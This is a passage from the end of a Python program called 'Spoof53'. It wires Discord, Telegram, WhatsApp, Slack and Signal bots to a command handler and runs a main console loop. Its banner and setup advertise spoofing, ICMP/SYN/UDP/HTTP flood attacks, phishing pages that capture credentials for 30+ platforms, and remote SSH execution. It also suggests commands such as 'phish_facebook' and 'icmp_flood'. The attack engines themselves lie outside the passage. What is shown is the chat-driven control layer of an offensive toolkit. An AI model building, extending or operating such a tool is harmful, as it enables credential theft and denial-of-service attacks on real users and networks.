            "prefix": prefix,
            "enabled": True
        }
        config_file = os.path.join(CONFIG_DIR, "discord.json")
        try:
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE:
            logger.error("Discord.py not installed")
            return False
        
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                self.running = True
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="5000+ Security Commands | !help"
                    )
                )
            
            @self.bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                
                if message.content.startswith(self.config.get('prefix', '!')):
                    cmd = message.content[1:].strip()
                    result = self.handler.execute_command(cmd, f"discord/{message.author.name}")
                    
                    output = result.get('output', '')
                    if len(output) > 1900:
                        output = output[:1900] + "...\n(truncated)"
                    
                    embed = discord.Embed(
                        title="🕶️ Spoof53 Response",
                        description=f"```{output}```",
                        color=0x5865F2
                    )
                    embed.set_footer(text=f"Execution time: {result.get('execution_time', 0):.2f}s")
                    await message.channel.send(embed=embed)
                
                await self.bot.process_commands(message)
            
            @self.bot.command(name='adduser')
            async def add_user(ctx, user_id: str, role: str = 'user'):
                """Add authorized user"""
                if ctx.author.guild_permissions.administrator:
                    success = self.db.add_user(user_id, 'discord', ctx.author.name, role)
                    if success:
                        await ctx.send(f"✅ User {user_id} added with role {role}")
                    else:
                        await ctx.send("❌ Failed to add user")
                else:
                    await ctx.send("❌ Admin permission required")
            
            await self.bot.start(self.config['token'])
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Discord bot in background thread"""
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            logger.info("Discord bot started in background thread")
            return True
        return False
    
    def _run_discord_bot(self):
        """Run Discord bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    """Telegram bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        """Load Telegram configuration"""
        config_file = os.path.join(CONFIG_DIR, "telegram.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
    
    def save_config(self, api_id: str, api_hash: str, bot_token: str = None):
        """Save Telegram configuration"""
        self.config = {
            "api_id": api_id,
            "api_hash": api_hash,
            "bot_token": bot_token,
            "enabled": True
        }
        config_file = os.path.join(CONFIG_DIR, "telegram.json")
        try:
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        """Start Telegram bot"""
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            logger.error("Telegram API credentials not configured")
            return False
        
        try:
            self.client = TelegramClient('spoof53_session', 
                                         self.config['api_id'],
                                         self.config['api_hash'])
            
            @self.client.on(events.NewMessage)
            async def message_handler(event):
                if event.message.text and event.message.text.startswith('/'):
                    cmd = event.message.text[1:].strip()
                    result = self.handler.execute_command(cmd, f"telegram/{event.sender_id}")
                    
                    output = result.get('output', '')
                    if len(output) > 4000:
                        output = output[:3900] + "\n... (truncated)"
                    
                    await event.reply(f"```{output}```\n*Time: {result.get('execution_time', 0):.2f}s*", 
                                     parse_mode='markdown')
            
            await self.client.start(bot_token=self.config.get('bot_token'))
            logger.info("Telegram bot connected")
            self.running = True
            await self.client.run_until_disconnected()
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Telegram bot in background thread"""
        if self.config.get('enabled'):
            thread = threading.Thread(target=self._run_telegram_bot, daemon=True)
            thread.start()
            logger.info("Telegram bot started in background thread")
            return True
        return False
    
    def _run_telegram_bot(self):
        """Run Telegram bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    """WhatsApp bot integration using Selenium"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = {}
        self.message_queue = queue.Queue()
    
    def load_config(self):
        """Load WhatsApp configuration"""
        config_file = os.path.join(CONFIG_DIR, "whatsapp.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Failed to load WhatsApp config: {e}")
    
    def save_config(self, phone_number: str = None):
        """Save WhatsApp configuration"""
        self.config = {
            "phone_number": phone_number,
            "enabled": True
        }
        config_file = os.path.join(CONFIG_DIR, "whatsapp.json")
        try:
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save WhatsApp config: {e}")
            return False
    
    def start(self):
        """Start WhatsApp bot"""
        if not SELENIUM_AVAILABLE:
            logger.error("Selenium not installed")
            return False
        
        try:
            chrome_options = Options()
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=800,600")
            
            user_data_dir = os.path.join(WHATSAPP_SESSION_DIR, "chrome_data")
            chrome_options.add_argument(f"--user-data-dir={user_data_dir}")
            
            if WEBDRIVER_MANAGER_AVAILABLE:
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                self.driver = webdriver.Chrome(options=chrome_options)
            
            self.driver.get("https://web.whatsapp.com")
            logger.info("WhatsApp Web opened. Please scan QR code if needed.")
            
            self.running = True
            threading.Thread(target=self._monitor_messages, daemon=True).start()
            return True
            
        except Exception as e:
            logger.error(f"Failed to start WhatsApp bot: {e}")
            return False
    
    def _monitor_messages(self):
        """Monitor WhatsApp messages"""
        try:
            wait = WebDriverWait(self.driver, 30)
            
            while self.running:
                try:
                    messages = self.driver.find_elements(By.CSS_SELECTOR, "div.message-in")
                    
                    for msg in messages:
                        try:
                            text_elem = msg.find_element(By.CSS_SELECTOR, "span.selectable-text")
                            text = text_elem.text
                            
                            if text and text.startswith('/'):
                                cmd = text[1:].strip()
                                result = self.handler.execute_command(cmd, "whatsapp")
                                
                                response = result.get('output', '')
                                if len(response) > 1000:
                                    response = response[:1000] + "..."
                                
                                input_box = self.driver.find_element(By.CSS_SELECTOR, "div[contenteditable='true']")
                                input_box.send_keys(response)
                                input_box.send_keys(Keys.ENTER)
                        except:
                            pass
                    
                    time.sleep(2)
                    
                except Exception as e:
                    logger.error(f"WhatsApp monitor error: {e}")
                    time.sleep(5)
                    
        except Exception as e:
            logger.error(f"WhatsApp monitor error: {e}")
    
    def stop(self):
        """Stop WhatsApp bot"""
        self.running = False
        if self.driver:
            self.driver.quit()
    
    def start_bot_thread(self):
        """Start WhatsApp bot in background thread"""
        if self.config.get('enabled'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            logger.info("WhatsApp bot started in background thread")
            return True
        return False

# =====================
# SLACK BOT
# =====================
class SlackBot:
    """Slack bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.socket_client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        """Load Slack configuration"""
        config_file = os.path.join(CONFIG_DIR, "slack.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Slack config: {e}")
    
    def save_config(self, bot_token: str, app_token: str = None):
        """Save Slack configuration"""
        self.config = {
            "bot_token": bot_token,
            "app_token": app_token,
            "enabled": True
        }
        config_file = os.path.join(CONFIG_DIR, "slack.json")
        try:
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save Slack config: {e}")
            return False
    
    def start(self):
        """Start Slack bot"""
        if not SLACK_AVAILABLE:
            logger.error("Slack SDK not installed")
            return False
        
        if not self.config.get('bot_token'):
            logger.error("Slack bot token not configured")
            return False
        
        try:
            self.client = WebClient(token=self.config['bot_token'])
            
            if self.config.get('app_token'):
                self.socket_client = SocketModeClient(
                    app_token=self.config['app_token'],
                    web_client=self.client
                )
                
                @self.socket_client.socket_mode_request_listeners.append
                def process_events(client, req: SocketModeRequest):
                    if req.type == "events_api":
                        event = req.payload.get("event", {})
                        if event.get("type") == "message" and event.get("text", "").startswith('!'):
                            cmd = event["text"][1:].strip()
                            result = self.handler.execute_command(cmd, f"slack/{event.get('user', 'unknown')}")
                            
                            self.client.chat_postMessage(
                                channel=event["channel"],
                                text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                            )
                
                self.socket_client.connect()
                logger.info("Slack bot connected (Socket Mode)")
                self.running = True
                
                while self.running:
                    time.sleep(1)
            else:
                logger.warning("Slack app token not provided. Limited functionality.")
                
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Slack bot: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Slack bot in background thread"""
        if self.config.get('enabled'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            logger.info("Slack bot started in background thread")
            return True
        return False

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    """Signal bot integration using signal-cli"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
        self.message_queue = queue.Queue()
    
    def load_config(self):
        """Load Signal configuration"""
        config_file = os.path.join(CONFIG_DIR, "signal.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Signal config: {e}")
    
    def save_config(self, phone_number: str = None):
        """Save Signal configuration"""
        self.config = {
            "phone_number": phone_number,
            "enabled": True
        }
        config_file = os.path.join(CONFIG_DIR, "signal.json")
        try:
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save Signal config: {e}")
            return False
    
    def start(self):
        """Start Signal bot"""
        if not SIGNAL_CLI_AVAILABLE:
            logger.error("signal-cli not found. Please install signal-cli")
            return False
        
        try:
            # Check if account exists
            check_cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'listAccounts']
            result = subprocess.run(check_cmd, capture_output=True, text=True)
            
            if not self.config.get('phone_number'):
                logger.warning("Signal phone number not configured")
                return False
            
            self.running = True
            
            # Start receive loop
            self._receive_messages()
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Signal bot: {e}")
            return False
    
    def _receive_messages(self):
        """Receive Signal messages"""
        try:
            while self.running:
                receive_cmd = ['signal-cli', '-u', self.config['phone_number'], 'receive']
                result = subprocess.run(receive_cmd, capture_output=True, text=True, timeout=60)
                
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Message:' in line:
                            # Parse message
                            parts = line.split('Message:')
                            if len(parts) > 1:
                                msg = parts[1].strip()
                                if msg.startswith('/'):
                                    cmd = msg[1:].strip()
                                    cmd_result = self.handler.execute_command(cmd, "signal")
                                    self._send_message(cmd_result.get('output', '')[:1000])
                
                time.sleep(5)
                
        except Exception as e:
            logger.error(f"Signal receive error: {e}")
    
    def _send_message(self, message: str):
        """Send Signal message"""
        try:
            send_cmd = ['signal-cli', '-u', self.config['phone_number'], 'send', '-m', message]
            subprocess.run(send_cmd, timeout=30)
        except Exception as e:
            logger.error(f"Signal send error: {e}")
    
    def start_bot_thread(self):
        """Start Signal bot in background thread"""
        if self.config.get('enabled'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            logger.info("Signal bot started in background thread")
            return True
        return False

# =====================
# MAIN APPLICATION
# =====================
class Spoof53:
    """Main application class"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.spoof_engine = SpoofingEngine(self.db)
        self.traffic_gen = TrafficGenerator(self.db)
        self.phishing_server = PhishingServer(self.db)
        self.handler = CommandHandler(self.db, self.spoof_engine, self.traffic_gen, self.phishing_server)
        
        self.discord_bot = DiscordBot(self.handler, self.db)
        self.telegram_bot = TelegramBot(self.handler, self.db)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.db)
        self.slack_bot = SlackBot(self.handler, self.db)
        self.signal_bot = SignalBot(self.handler, self.db)
        
        self.running = True
    
    def print_banner(self):
        """Print banner"""
        banner = f"""
{Colors.BOLD}{Colors.MAGENTA}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.CYAN}                                                                                      {Colors.MAGENTA}║
║{Colors.CYAN}                         🕶️ SPOOF53 -                                                {Colors.MAGENTA}║
║{Colors.CYAN}                                                                                      {Colors.MAGENTA}║
║{Colors.CYAN}                                                                                      {Colors.MAGENTA}║
║{Colors.CYAN}                                                                                      {Colors.MAGENTA}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN}  🤖 PLATFORMS:    Discord • Telegram • WhatsApp • Slack • Signal                     {Colors.MAGENTA}║
║{Colors.GREEN}  🎭 SPOOFING:     IP • MAC • ARP • DNS Spoofing                                      {Colors.MAGENTA}║
║{Colors.GREEN}  💥 ATTACKS:      ICMP • SYN • UDP • HTTP Floods                                     {Colors.MAGENTA}║
║{Colors.GREEN}  🎣 PHISHING:     30+ Platforms • Credential Capture                                  {Colors.MAGENTA}║
║{Colors.GREEN}  🔐 SSH:          Remote Command Execution • File Transfer                           {Colors.MAGENTA}║
║{Colors.GREEN}  🔍 SCANNING:     Nmap • Curl • Wget • Netcat • Dig • WhoIs                          {Colors.MAGENTA}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.CYAN}💡 Type 'help' for command list | 'status' for system status{Colors.RESET}
{Colors.YELLOW}🎣 Type 'phish_facebook' for phishing link | 'icmp_flood 192.168.1.1 30' for flood test{Colors.RESET}
        """
        print(banner)
    
    def setup_platforms(self):
        """Setup bot platforms"""
        print(f"\n{Colors.CYAN}🤖 Bot Platform Setup{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        # Discord setup
        print(f"\n{Colors.BLUE}📱 Discord Bot{Colors.RESET}")
        discord_token = input(f"{Colors.YELLOW}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
        if discord_token:
            prefix = input(f"{Colors.YELLOW}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
            self.discord_bot.save_config(discord_token, prefix)
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Discord bot started!{Colors.RESET}")
            self.db.update_platform_status('discord', True, 'connected')
        else:
            self.db.update_platform_status('discord', False, 'disabled')
        
        # Telegram setup
        print(f"\n{Colors.BLUE}📱 Telegram Bot{Colors.RESET}")
        api_id = input(f"{Colors.YELLOW}Enter Telegram API ID (or press Enter to skip): {Colors.RESET}").strip()
        if api_id:
            api_hash = input(f"{Colors.YELLOW}Enter Telegram API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.YELLOW}Enter Telegram Bot Token (optional): {Colors.RESET}").strip()
            self.telegram_bot.save_config(api_id, api_hash, bot_token or None)
            if self.telegram_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Telegram bot started!{Colors.RESET}")
            self.db.update_platform_status('telegram', True, 'connected')
        else:
            self.db.update_platform_status('telegram', False, 'disabled')
        
        # WhatsApp setup
        print(f"\n{Colors.BLUE}📱 WhatsApp Bot{Colors.RESET}")
        whatsapp_enable = input(f"{Colors.YELLOW}Enable WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if whatsapp_enable == 'y':
            phone = input(f"{Colors.YELLOW}Enter your WhatsApp phone number (optional): {Colors.RESET}").strip()
            self.whatsapp_bot.save_config(phone or None)
            if self.whatsapp_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ WhatsApp bot started! Scan QR code in browser.{Colors.RESET}")
            self.db.update_platform_status('whatsapp', True, 'starting')
        else:
            self.db.update_platform_status('whatsapp', False, 'disabled')
        
        # Slack setup
        print(f"\n{Colors.BLUE}📱 Slack Bot{Colors.RESET}")
        slack_token = input(f"{Colors.YELLOW}Enter Slack Bot Token (or press Enter to skip): {Colors.RESET}").strip()
        if slack_token:
            app_token = input(f"{Colors.YELLOW}Enter Slack App Token (optional): {Colors.RESET}").strip()
            self.slack_bot.save_config(slack_token, app_token or None)
            if self.slack_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Slack bot started!{Colors.RESET}")
            self.db.update_platform_status('slack', True, 'connected')
        else:
            self.db.update_platform_status('slack', False, 'disabled')
        
        # Signal setup
        print(f"\n{Colors.BLUE}📱 Signal Bot{Colors.RESET}")
        if SIGNAL_CLI_AVAILABLE:
            signal_phone = input(f"{Colors.YELLOW}Enter Signal phone number (with country code, or press Enter to skip): {Colors.RESET}").strip()
            if signal_phone:
                self.signal_bot.save_config(signal_phone)
                if self.signal_bot.start_bot_thread():
                    print(f"{Colors.GREEN}✅ Signal bot started!{Colors.RESET}")
                self.db.update_platform_status('signal', True, 'connected')
            else:
                self.db.update_platform_status('signal', False, 'disabled')
        else:
            print(f"{Colors.YELLOW}⚠️ signal-cli not found. Signal bot disabled.{Colors.RESET}")
            self.db.update_platform_status('signal', False, 'signal-cli not found')
        
        print(f"\n{Colors.GREEN}✅ Platform setup complete!{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Load bot configurations
        self.discord_bot.load_config()
        self.telegram_bot.load_config()
        self.whatsapp_bot.load_config()
        self.slack_bot.load_config()
        self.signal_bot.load_config()
        
        # Setup if first run
        if not os.path.exists(os.path.join(CONFIG_DIR, "discord.json")):
            self.setup_platforms()
        else:
            # Start bots if configured
            if self.discord_bot.config.get('enabled'):
                self.discord_bot.start_bot_thread()
            if self.telegram_bot.config.get('enabled'):
                self.telegram_bot.start_bot_thread()
            if self.whatsapp_bot.config.get('enabled'):
                self.whatsapp_bot.start_bot_thread()
            if self.slack_bot.config.get('enabled'):
                self.slack_bot.start_bot_thread()
            if self.signal_bot.config.get('enabled'):
                self.signal_bot.start_bot_thread()
        
        print(f"\n{Colors.GREEN}✅ SPOOF53 ready! Bots are running in background.{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Reports: {REPORT_DIR}{Colors.RESET}")
        print(f"\n{Colors.BOLD}Type 'help' for commands | 'exit' to quit{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.MAGENTA}🕶️{Colors.RESET} "
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    self.running = False
                    print(f"{Colors.YELLOW}👋 Shutting down SPOOF53...{Colors.RESET}")
                    break
                
                elif command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                    continue
                
                result = self.handler.execute_command(command)
                
                if result.get('success'):
                    output = result.get('output', '')
                    if isinstance(output, dict):
                        output = json.dumps(output, indent=2)
                    
                    print(output)
                    if result.get('execution_time'):
                        print(f"\n{Colors.GREEN}✅ Executed in {result['execution_time']:.2f}s{Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ Error: {result.get('output', 'Unknown error')}{Colors.RESET}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.phishing_server.stop()
        self.spoof_engine.stop_spoofing()
        self.traffic_gen.stop_generation()
        self.whatsapp_bot.stop()
        self.db.close()
        
        print(f"\n{Colors.GREEN}✅ Shutdown complete.{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher required{Colors.RESET}")
            sys.exit(1)
        
        # Check for root privileges for advanced features
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            print(f"{Colors.YELLOW}⚠️  Warning: Running without root privileges{Colors.RESET}")
            print(f"{Colors.YELLOW}   Advanced features (ARP spoofing, MAC spoofing) require root{Colors.RESET}")
            print(f"{Colors.YELLOW}   Run with sudo for full functionality{Colors.RESET}")
            time.sleep(2)
        
        app = Spoof53()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()